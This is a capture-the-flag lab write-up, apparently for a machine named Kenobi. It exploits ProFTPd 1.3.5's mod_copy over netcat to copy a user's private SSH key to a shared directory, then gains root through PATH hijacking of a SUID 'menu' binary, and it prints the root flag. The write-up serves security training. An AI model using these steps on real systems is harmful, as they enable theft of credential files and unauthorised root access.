# Gaining Access

## ProFTPd

from the above nmap scan we found the running proftp version is 1.3.5
We'll use `searchsploit` to find known vulnerabilities for that version:

```console
searchsploit proftpd 1.3.5 
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                  | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                        | linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                                                                                                  | linux/remote/36742.txt
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

We can read more about the `mod_copy` module [HERE](http://www.proftpd.org/docs/contrib/mod_copy.html). to summarize, we can use this module to copy files from one location to another.
Let's copy the private SSH keys of the kenobi user to a directory we can access:
We'll use `netcat` to connect to the FTP port and use `SITE CPFR` (copy from) and `SITE CPTO` (copy to):

```console
nc 10.10.12.44 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.12.44]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

We now have a copy of the id_rsa file in a location we can access - `/var`(see section about SMB/SAMBA). Let's mount that diretory to our machine in order to access it (please double check if sudo is needed on your user):

1.  Create a mount directory on out machine - `sudo mkdir /mnt/kenobi`
2.  Mount the remote directory to our machine - `sudo mount 10.10.12.44:/var /mnt/kenobi`
3.  list avaiable files to verify we have the `id_rsa` file from remote `/var/tmp` directory - `ls -la /mnt/kenobi/tmp`
4.  for ease of use for next steps I prefer to copy that file into my working directory/project directory - `cp /mnt/kenobi/tmp/id_rsa .`
5.  Unmount the new directory - `sudo umount /mnt/kenobi`

# Privilege Escalation

Explanation about SUID, SGID and Sticky Bits:

![SUID SGID](https://i.imgur.com/LN2uOCJ.png){: .normal}

Let's look for files that have the SUID Bit enabled - `find / -perm -u=s -type f 2>/dev/null` (the `2>/dev/null` part will make our output much cleaner and easier to read)

We see unusual file in `/usr/bin/menu`.

Check the file permissions:

```console
ls -la /usr/bin/menu 
-rwsr-xr-x 1 root root 8880 Sep  4  2019 /usr/bin/menu
```

As we can see the file is running using root privileges.
Running it will propt us with the following:

```console
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
```

If we want to look into this binary we can use sumple `cat` yet the output is messy. Using `strings` command is much batter and will output only readable charecters to the screen - `strings /usr/bin/menu`.
We can see that according to our choice, the binary is invoking Linux commands behind the scene - `curl`, `uname` and `ifconfig`.
As the binary running these commands without using their full path we might be able to manipulate the commands path and make the binary invoke a malicues command instead (keep in mind it is running as root!)

Let's overwrite `curl` path and make our script invoke `bash` instead:

1.  Change dir to `/tmp` as that folder permissions is very ???????????????
2.  Create a new file conatining the malicious command (running bash) - `echo /bin/bash > curl` and change the file permissions so it can be executed - `chmod 777 curl`
3.  Overwrite `curl` path - `export PATH=/tmp:$PATH`
4.  run the binary and force it to call `curl` by selecting the `1. status check` option

```console
/usr/bin/menu 

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
```

5.  Now use `whoami` to verify we're root

Now as root we can access the flag:

```console
cat /root/root.txt
177b3cd8562289f37382721c28381f02
```
